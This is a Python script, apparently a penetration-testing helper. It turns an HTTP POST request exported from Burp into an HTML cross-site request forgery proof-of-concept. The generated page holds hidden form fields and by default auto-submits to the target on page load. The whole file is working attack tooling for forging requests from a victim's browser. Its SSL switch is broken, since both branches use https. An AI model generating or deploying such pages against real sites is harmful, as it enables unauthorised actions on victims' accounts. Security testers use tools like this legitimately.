from optparse import OptionParser

parser = OptionParser()
parser.add_option("-f", "--file", dest="filename",
                  help="input request FILE from burp", metavar="FILE")
parser.add_option("-o", "--out", dest="dest_file",
                  help="write PoC to FILE", metavar="OUT", default="poc.html")
parser.add_option("-s", "--SSL", dest="ssl",
                  help="Default https request, --SSL False to use http instead", metavar="SSL", default=True)
parser.add_option("-b", "--button", dest="button",
                  help="Default autosubmit", metavar="button")


(options, args) = parser.parse_args()

f= open(options.filename,"r")
out = open(options.dest_file,"w+")

file = f.readlines()

prev = "!"
boundary = ""
method = ""
body = ""
name = ""

for line in file:
	line = line.strip()
	if line.startswith("POST"):
		method = "POST"
		endpoint = line.split()[1]
	if line.startswith("Host:"):
		if options.ssl == True:
			protocol = "https://"
		else :
			protocol = "https://"
		url = protocol + line.split()[1]
		if options.button == None:
			out.write('<body onload="csrf();"></body>\n')
			out.write('<script>function csrf() {document.getElementById("CSRF").submit()}</script>\n')
		out.write("<form method='" + method + "' id='CSRF' action='" + url + endpoint +"'>\n")
	if name != "" and len(line) != 0:
		if boundary in line:
			line = ""
		out.write("\t<input type='hidden' name='" + name + "' id='" + name + "' value='" + line+ "'>\n")
		name = ""
	if line.startswith("Content-Type:"):
		content = line.split()
		if content[1] == "multipart/form-data;":
			boundary = content[2].split("=")[1]
	if boundary != "" and line.startswith("Content-Disposition"):
		name = line.split("=")[1]
	if len(prev) == 0 and boundary == "":
		body = line
		break
	prev = line

if boundary == "":
	data = body.split("&")
	for d in data:
		splits = d.split("=")
		out.write("\t<input type='hidden' name='" + splits[0] + "' id='" + splits[0] + "' value='" + splits[1]+ "'>\n")

if options.button != None:
	out.write("\t<input type='Submit' value='Submit'>\n")
out.write("</form>\n")
